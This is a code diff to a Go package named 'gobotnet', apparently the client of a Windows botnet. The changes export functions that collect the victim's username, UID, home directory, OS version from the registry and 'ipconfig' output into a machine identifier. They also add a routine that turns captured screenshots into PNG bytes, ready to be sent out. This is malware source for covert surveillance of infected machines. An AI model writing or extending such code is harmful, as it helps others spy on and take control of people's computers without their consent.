@@ -2,6 +2,7 @@ package gobotnet
 
 import (
 	//"encoding/base64"
+	"bytes"
 	"fmt"
 	"github.com/satori/go.uuid"
 	"github.com/vova616/screenshot"
@@ -20,37 +21,38 @@ func CmdTest() {
 	// fmt.Println(getUsername())
 	// fmt.Println(getHomeDir())
 	//fmt.Println(base64.StdEncoding.EncodeToString([]byte(getIdentificator())))
-	image := getScreenshot()
-	SaveImageToFile(image, "1.png")
-
+	image := GetScreenshot()
+	bytes, _ := ImageToBytes(image)
+	fmt.Println(bytes)
+	//SaveImageToFile(image, "1.png")
 }
 
-func getUsername() string {
+func GetUsername() string {
 	usr, _ := user.Current()
 	return usr.Username
 }
 
 func getIdentificator() string {
 	ipConfigOut, _ := CmdExec("ipconfig")
-	return uuid.NewV4().String() + getUsername() + string(ipConfigOut)
+	return uuid.NewV4().String() + GetUsername() + string(ipConfigOut)
 }
 
-func getUid() string {
+func GetUid() string {
 	usr, _ := user.Current()
 	return usr.Uid
 }
 
-func getHomeDir() string {
+func GetHomeDir() string {
 	usr, _ := user.Current()
 	return usr.HomeDir
 }
 
-func getName() string {
+func GetName() string {
 	usr, _ := user.Current()
 	return usr.Name
 }
 
-func getOS() string {
+func GetOS() string {
 	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion`, registry.READ)
 	if err != nil {
 		return ""
@@ -62,7 +64,7 @@ func getOS() string {
 	return value
 }
 
-func getScreenshot() *image.RGBA {
+func GetScreenshot() *image.RGBA {
 	img, err := screenshot.CaptureScreen()
 	if err != nil {
 		OutMessage(err.Error())
@@ -83,4 +85,11 @@ func SaveImageToFile(image *image.RGBA, nameFile string) error {
 	}
 	f.Close()
 	return nil
+}
+
+func ImageToBytes(image *image.RGBA) ([]byte, error) {
+	buf := new(bytes.Buffer)
+	err := png.Encode(buf, image)
+	imageBytes := buf.Bytes()
+	return imageBytes, err
 }
